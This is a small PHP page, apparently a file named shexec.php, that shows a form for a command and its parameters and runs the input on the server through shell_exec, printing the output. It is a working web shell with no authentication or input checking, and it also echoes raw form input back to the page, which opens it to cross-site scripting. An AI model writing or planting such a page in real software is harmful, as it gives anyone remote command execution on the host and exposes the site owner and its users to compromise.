<html>
<body>
<table widht=500><td>
<!-- written by pyavinci@gmail.com -->

<form action="shexec.php" method="post">
Command: <input type="text" name="cmd" />
Params: <input type="text" name="params" />
<input type="submit" />
</form>
<hr>
Shell command executed : 
<?php echo $_POST["cmd"]; ?>
<?php echo $_POST["params"]; ?> 
<hr>
<?php
$lcmd =  $_POST["cmd"]." ".$_POST["params"];
$output = shell_exec($lcmd);
echo "<pre>$output</pre>";
?>
</td></table>
</body>
</html>
